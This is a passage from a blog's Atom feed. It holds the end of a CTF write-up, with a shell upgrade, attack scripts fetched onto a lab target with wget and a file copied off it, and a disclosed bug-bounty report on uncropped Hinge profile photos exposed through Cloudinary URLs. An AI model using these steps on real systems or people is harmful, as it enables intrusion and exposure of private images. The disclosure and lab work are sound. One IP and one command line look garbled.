+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-hackme-ctf-writeup/12-reverse-shell.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;I used the whoami command to check my current privilege, which showed I was www-data, a low-priv user. The shell received was also limited, so to upgrade it I ran the following.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;&lt;span class=&quot;token environment constant&quot;&gt;PATH&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;&lt;span class=&quot;token environment constant&quot;&gt;TERM&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;xterm&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;&lt;span class=&quot;token builtin class-name&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;&lt;span class=&quot;token environment constant&quot;&gt;SHELL&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;bash&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;python -c &lt;span class=&quot;token string&quot;&gt;&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;&lt;/span&gt;&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-hackme-ctf-writeup/13-updated-shell.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;br&gt;
+&lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h3&gt;
+&lt;p&gt;The final step in this CTF was to escalate my user privilege to root. My first attempt was to run my favorite automated priv escalation script, also courtesy of the &lt;a href=&quot;https://www.google.com/url?sa=t&amp;amp;rct=j&amp;amp;q=&amp;amp;esrc=s&amp;amp;source=web&amp;amp;cd=1&amp;amp;cad=rja&amp;amp;uact=8&amp;amp;ved=2ahUKEwikheDpypDlAhWhnOAKHTdMBVEQFjAAegQIBRAB&amp;amp;url=http%3A%2F%2Fpentestmonkey.net%2Ftools%2Faudit%2Funix-privesc-check&amp;amp;usg=AOvVaw0zKEIT3uLrcBFLsG1oZ63j&quot;&gt;pentestmonkeys&lt;/a&gt;. To get this script on the target, I uploaded it to my local attack machine webserver with the following command.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;cp&lt;/span&gt; unix-privesc-check /var/www/html&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I started the apache2 web service with the following.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;service&lt;/span&gt; apache2 start&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then, I used wget in the target reverse shell to download the script to the target machine.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;wget&lt;/span&gt; http://192.168.8.128/unix-privesc-check&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-hackme-ctf-writeup/14-upload-privesc.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;To run the script, I changed the permissions of the file to 777, and then executed it.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;wget&lt;/span&gt; www-data$ &lt;span class=&quot;token function&quot;&gt;chmod&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;777&lt;/span&gt; Unix-privesc-check&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;$ ./Unix-privesc-check&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Unfortunately, I received an error message that the target machine does not have the “strings” function, which is necessary in order to run the program. With my best priv escalation option off the table, I began searching for other similar scripts. I used the same process of downloading scripts to the target, changing permissions, and running the programs for some additional automated scipts. I used the following scripts from GitHub. Each one gave varying degree of enumeration information&lt;/p&gt;
+&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/AlessandroZ/BeRoot&quot;&gt;BeRoot&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/TheSecondSun/Bashark&quot;&gt;Bashark&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/jondonas/linux-exploit-suggester-2&quot;&gt;Linux-exploit-suggester-2&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;LinEnum&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/sleventyeleven/linuxprivchecker&quot;&gt;linuxprivchecker&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
+&lt;p&gt;Armed with more information, I began a manual search of the target. In the enumeration from the above scripts, I noticed that the /etc/passwd file was readable, so I checked that out with the cat command.&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-hackme-ctf-writeup/15-cat-passwd.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;This showed that a user named “hackme” existed on the target. I navigated to the user’s folder and listed out the directories. In addition to the user hackme, there was also a folder for “legacy”. Entering that folder, I came across a file named touchmenot. Using the cat command, I attempted to read this file, however the output showed it was not in a readable format. I copied this file to my attack machine for further inspection. To get the file to my attack machine, I copied it to the targets webserver and then used wget on my attack machine to download the file&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;cp&lt;/span&gt; touchmenot /var/www/html&lt;/div&gt;&lt;div class=&quot;highlight-line&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;wget&lt;/span&gt; http://92.168.8.129/touchmenot&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-hackme-ctf-writeup/16-cp-touchmenot.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;With the file on my attack machine, I used binwalk on it to see what type of file it was.&lt;/p&gt;
+&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;div class=&quot;highlight-line&quot;&gt;$ binwalk touchmenot&lt;/div&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Binwalk showed the file was actually an executable. Still not knowing what it does, I decided to run it on the target machine. After I ran the script, it was shown highlighted in red. Out of curiosity, I checked my permissions, and low and behold I was root.&lt;/p&gt;
+&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-06-02-hackme-ctf-writeup/17-root.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;There are no flag files located in this CTF, so with root permissions, the challenge was complete.&lt;/p&gt;
+</content>
+  </entry>
+  
+  
+  <entry>
+    <title>Hinge Hackerone Writeup</title>
+    
+    <link href="https://tbutler.org/posts/2020/05/hinge-hackerone-writeup/" rel="alternate" type="text/html"/>
+    
+    <updated>2020-05-15T00:00:00-04:00</updated>
+    <id>https://tbutler.org/posts/2020/05/hinge-hackerone-writeup/</id>
+    <content type="html">&lt;div class=&quot;row mt-3&quot;&gt;
+    &lt;div class=&quot;col-sm mt-3 mt-md-0&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-07-05-hackerone-hinge/hinge-preview.png&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;a href=&quot;https://tbutler.org/assets/pdf/Butler,Tyler-MAID-Hinge-BBR.pdf&quot;&gt;
+  &lt;button type=&quot;button&quot; class=&quot;btn btn-primary&quot; data-toggle=&quot;button&quot; aria-pressed=&quot;false&quot; autocomplete=&quot;off&quot;&gt;
+    See PDF Report
+  &lt;/button&gt;
+&lt;/a&gt;
+&lt;h1&gt;Abstract&lt;/h1&gt;
+&lt;p&gt;Hinge is dating application for android and iOS devices launched in 2013. Like its competitors Tinder and Bumble, it enables users to search through a database of other users and match with potential dating partners. Offering features to create unique profiles, integrate with existing social platforms, and chat with other users, it uses a mixture of proprietary code and third-party services. This report outlines a low risk misconfiguration disclosed to Hinge through Hackerone in March of 2020 by Tyler Butler and triaged in June 2020. Hackerone is a bug bounty platform that connects freelance security researchers with clients to enable public and private security vulnerability disclosure.&lt;/p&gt;
+&lt;p&gt;The report outlines a potential vulnerability by exploiting improper media access controls in a third-party media storage provider used by Hinge. By abusing the default configuration of the Cloudinary Image Transformation API, original user images could be accessed in their original and unedited state. This posed a minimal risk to users who intend to use the crop feature to remove undesirable and potentially sensitive aspects of profile photos. While is unlikely that leaving the application in its disclosed state would result in widespread sensitive information leak, Hinge decided to triage the application to mitigate the risks involved. To exploit the flaw on a large scale, an attacker would need a highly customized.&lt;/p&gt;
+&lt;h1&gt;Scope&lt;/h1&gt;
+&lt;p&gt;This report is constrained only to the Hinge iOS application (app-id 595287172), the hinge.app.link subdomain, and the hinge-res.cloudinary subdomain. While the security settings exploited in the Hackerone report applies to the Android app as well, it will not be discussed.&lt;/p&gt;
+&lt;h1&gt;Testing Approach&lt;/h1&gt;
+&lt;p&gt;The general approach to the security analysis conducted in this report involved two main steps. First, Burpsuite was used to intercept network traffic sent between a sample iPhone and the Hinge HTTP and HTTPS API endpoints. Burpsuite is an application security testing software produced by Portswigger. Intercepted traffic was dissected by endpoint, and manually analyzed. Second, the application was used on an iPhone as a normal user. Features which exposed endpoints were tested and all external links were collected and analyzed. To protect Hinge user’s personal information, exploit POC documentation included in this report uses sample Cloudinary assets not associated with Hinge.&lt;/p&gt;
+&lt;h1&gt;Application Design&lt;/h1&gt;
+&lt;p&gt;The Hinge platform consists of native applications for both android and iOS devices. In addition to integration with the Facebook-owned social media platform Instagram, there are also several third-party Software as a Service (SaaS) providers used to supplement custom development. According to data analyzed from BurpSuite packet captures Hinge uses SendBird, a chat as a service platform; Braze, a CRM and marketing platform; and Branch, a mobile measurement and deep-link solution platform. Central to application is the ability for users to create custom profiles using a mixture of user-uploaded images, captions, questionnaire answers, and link to their Instagram feed. Storage of user images is done through Software as a Service (SaaS) provider, Cloudinary. Users are required to upload six images when first creating an account, and the first image displayed on the profile is used as the user’s profile picture.&lt;/p&gt;
+&lt;h1&gt;Third Party Services&lt;/h1&gt;
+&lt;p&gt;&lt;em&gt;Cloudinary&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;The Cloudinary platform offers image, video, asset, and media management solutions for developers and e-commerce2. It is used in photo-heavy applications because of its easy to use API. Best summed up on the Cloudinary website, the API enables users to,&lt;br&gt;
+“apply artistic effects to an image or to simply scale it. With simple system of chained transformations, you can crop, scale, transcode, filter, and optimize your original high-resolution images on the fly. Tailor transformations based on conditional parameters or the viewing context to deliver the most appropriate version to users”3. The ability to dynamically display assets based on conditions means that assets can be displayed optimally regardless of their environment. This can commonly be seen in the use of thumbnail images. When the image needs to be displayed as a thumbnail or icon, it will dynamically be optimized to retain its essential aspects despite being reduced in size. Cloudinary clients include Buzzfeed, CNN, and Uber among others.&lt;/p&gt;
+&lt;h3 id=&quot;cloudinary-image-transformation-api&quot;&gt;&lt;em&gt;Cloudinary Image Transformation API&lt;/em&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;Transform Parameters&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Each asset in the Cloudinary media library is given a unique public ID and is accessible through their website at the &lt;a href=&quot;http://cloudinary.com/image/upload&quot;&gt;cloudinary.com/image/upload&lt;/a&gt; directory. Cloudinary uses dynamic URL’s to apply effects to images on its platform. To apply effects, transformation parameters can be appended to the address of the asset. In total, 33 different transformation parameters can be used for a variety of purposes such as changing height and width, effects, backgrounds, and custom functions among others.4 An example of a transformed image on Hinge looks like the following,&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;https://hinge-res.cloudinary.com/image/upload/x_0.18,y_0.21,w_0.36,h_0.27,c_crop/w_1055,q_auto/f_webp/&quot;&gt;https://hinge-res.cloudinary.com/image/upload/x_0.18,y_0.21,w_0.36,h_0.27,c_crop/w_1055,q_auto/f_webp/&lt;/a&gt;[profile number]/[unique profile id].jpg&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;When users make a change to an image hosted on Cloudinary, new transformation requests are added on the fly. Original image assets themselves are not changed, however, transformation parameters applied to the request URL change what is displayed when requested. This distinction means that both the original asset as it was uploaded to the platform as well as the new requested URL with transformations are able to be requested and exist available to the public. This is an intended function of Cloudinary and a default setting, however, this can be changed through the enforcement of Media Access Controls such as Strict Transformation and Signed Delivery URLS5.&lt;/p&gt;
+&lt;h3 id=&quot;media-access-controls&quot;&gt;&lt;em&gt;Media Access Controls&lt;/em&gt;&lt;/h3&gt;
+&lt;p&gt;One media access control method to mitigate the risk of user requested transformations is Strict Transformations. Through this feature, application owners can explicitly define which, if any, transformations can be requested by users. Another access control method is the Signed Delivery URL option. With this option, images are validated using a URL signature which is a base64 encoding of a SHA1 digest made from the application owners image ID and transformation string chained with the API secret. Only images which pass authentication can be viewed, meaning access to images can be controlled for private/authenticated viewing or manipulation.&lt;/p&gt;
+&lt;h1&gt;Vulnerability Discovery&lt;/h1&gt;
+&lt;p&gt;The risk described in this report and submitted to Hinge relies on the lack of use of media access controls on user images. In fact, by default, no access controls are implemented on the Cloudinary platform. In effect, this means that any asset uploaded to the platform should be accessible in its original state regardless of what users cropped out in the app. To exploit these settings, the URL address of user profile pictures needed to be located. This was achieved using the iOS app “share profile” option. This feature enables users to share profiles with others. The feature generates a standard message, “I recommended [Username] for you on Hinge! Log into the app to view their profile”, as well as a URL link to the user’s profile with the format,&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;https://app.hinge.co/&quot;&gt;https://app.hinge.co/&lt;/a&gt;[User profile ID]&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;When shared through SMS messaging and opened on mobile devices with Hinge installed, the link triggers the application to open. If Hinge is not installed, the user will be re-directed to the app store. Users are automatically guided in this way from the use of iOS deep links, a feature implement for iOS in 20096.&lt;/p&gt;
+&lt;div class=&quot;row&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-07-05-hackerone-hinge/figure2.png&quot; alt=&quot;&quot; title=&quot;example image&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Figure 2 shows the &lt;a href=&quot;http://hinge.co/&quot;&gt;hinge.co&lt;/a&gt; subdomain which hosts the Universal Link json file necessary for such configurations. User profiles are also able to be viewed with a browser. Browser-based Hinge profiles feature only the username, a comment, and a profile photo. Browser access to the user profile photo allowed for easy access to the custom Hinge Cloudinary domain, &lt;em&gt;&lt;a href=&quot;http://hinge-res.cloudinary.com/&quot;&gt;hinge-res.cloudinary.com&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&quot;row&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;img-fluid rounded z-depth-1&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-07-05-hackerone-hinge/figure3.png&quot; alt=&quot;&quot; title=&quot;example image&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;As seen in Figure 3, profile pictures are loaded into the browser-based profile page through the hinge-res subdomain of Cloudinary. The URL extension, including the various tags denoted with backspaces, are a part of the Cloudinary Image Transformation API.&lt;/p&gt;
+&lt;h1&gt;Exploiting the Transform API&lt;/h1&gt;
+&lt;p&gt;With no media access controls in place, exploitation of the transform API is fairly straight forward. By removing the transformation parameters to the GET request URL, the original asset can be seen as it was uploaded by the user.&lt;/p&gt;
+&lt;h1&gt;Risks&lt;/h1&gt;
+&lt;p&gt;The risks involved in leaving original user assets available publicly are low. Hackerone classified this finding as a 3.7 on Hackerone’s severity scale. Still, some of the findings using this method to view original images were interesting. Some user’s uploaded screenshots of their personal mobile devices, and only after upload edited the image to zoom in on a face or body. The full screen shot exposed other information about those users. In one example, a screenshot of the users Instagram profile revealed their name and Instagram handle. Other users uploaded images in various stages of undress and used the crop feature to crop out features other than their face. Commonly, many users used the crop feature to crop themselves out of images with others, including large group photo’s or photos with significant others.&lt;/p&gt;
+&lt;p&gt;While no seriously damaging information or images was found through this method, it does not take much extrapolation to see how in the wrong hands, a determined attacker could scrape these images and find a subset that the user would not want available online.&lt;/p&gt;
+&lt;h1&gt;Proof of Concept&lt;/h1&gt;
+&lt;p&gt;To demonstrate accessing original user assets, and to protect the information and identify of Hinge users, a limited proof of concept has been created using a free account on the Cloudinary platform. After creating a free account, a public domain image was uploaded to the account’s media library. Next, using the Transformations dashboard, a new transformation was created which adjusts image width to 461 pixels, moves the x axis to position 190 and the y axis to position 0. The final transformation request looks like the following “c_crop,w_461,x_190,y_0”. With Strict Transformations not enabled, the transformation was applied to the sample image . The new transformed image was browsed at the footnoted address and is shown in Figure 5.7.&lt;/p&gt;
+&lt;div class=&quot;row&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;center&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-07-05-hackerone-hinge/figure5.png&quot; alt=&quot;&quot; title=&quot;example image&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;To demonstrate the flaw with default Cloudinary settings, the transformation parameter was removed from the requested address. The original image was browsed using the footnoted address and is shown in Figure 6.8&lt;/p&gt;
+&lt;div class=&quot;row&quot;&gt;
+    &lt;div class=&quot;center&quot;&gt;
+        &lt;img class=&quot;center&quot; src=&quot;https://tbutler.org/assets/images/posts/2020-07-05-hackerone-hinge/figure6.png&quot; alt=&quot;&quot; title=&quot;example image&quot;&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;a href=&quot;https://tbutler.org/assets/pdf/Butler,Tyler-MAID-Hinge-BBR.pdf&quot;&gt;
+  &lt;button type=&quot;button&quot; class=&quot;btn btn-primary&quot; data-toggle=&quot;button&quot; aria-pressed=&quot;false&quot; autocomplete=&quot;off&quot;&gt;
+    For citations, View PDF Report
+  &lt;/button&gt;
+&lt;/a&gt;</content>
+  </entry>
+</feed>
